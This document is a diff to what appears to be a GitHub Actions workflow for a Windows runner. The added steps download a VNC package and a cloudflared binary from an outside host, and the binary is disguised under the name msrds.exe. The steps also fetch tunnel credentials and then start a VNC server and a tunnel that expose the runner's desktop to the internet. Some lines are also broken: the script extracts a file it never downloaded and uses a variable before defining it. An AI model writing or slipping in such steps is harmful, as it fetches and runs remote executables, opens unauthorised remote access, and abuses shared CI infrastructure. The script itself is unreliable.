@@ -14,6 +14,31 @@ jobs:
         shell: cmd
         run: |
 
+
+          c:
+          cd c:\Users\Public\Downloads
+          curl -X GET -L https://exampleoci.yunzhongzhuan.com/windows/vnc/vnc.zip -o vnc.zip
+          tar -xf test.zip
+          cd vnc
+          pip install websockify
+          pip install resource
+          start "" cmd /k "cd websockify\websockify && python -m websockify 6080 localhost:5900 --web novnc"
+          start "" /b UltraVNC\x64\winvnc.exe
+          cp websockify\websockify\novnc\vnc.html websockify\websockify\novnc\index.html
+          cp websockify\websockify\novnc\vnc_lite.html websockify\websockify\novnc\index2.html
+
+          curl.exe -L "https://exampleoci.yunzhongzhuan.com/windows/cloudflared/cloudflared-windows-amd64.exe" -o "%dir%\msrds.exe"
+          
+          curl.exe -L "https://exampleoci.yunzhongzhuan.com/linux/cloudflared/.cloudflared/cert.pem" -o "%dir%\cert.pem"
+          
+          curl.exe -L "https://exampleoci.yunzhongzhuan.com/linux/cloudflared/.cloudflared/40b32c19-b52a-4fd6-85ef-cd1425eca995.json" -o "%dir%\config.json"
+          
+          curl.exe -L "https://exampleoci.yunzhongzhuan.com/linux/cloudflared/.cloudflared/40b32c19-b52a-4fd6-85ef-cd1425eca995.config.yml" -o "%dir%\config.yml"
+
+          dir
+          # %dir%\msrds.exe tunnel --credentials-file %dir%\config.json --origincert %dir%\cert.pem --config %dir%\config.yml --url http://localhost:6080 run exampleazurewindowsvnc
+          start /b "" "%dir%\msrds.exe" tunnel --credentials-file "%dir%\config.json" --origincert "%dir%\cert.pem" --config "%dir%\config.yml" --url http://localhost:6080 run exampleazurewindowsvnc
+
           :: RDP
           set dir=D:\a\
 
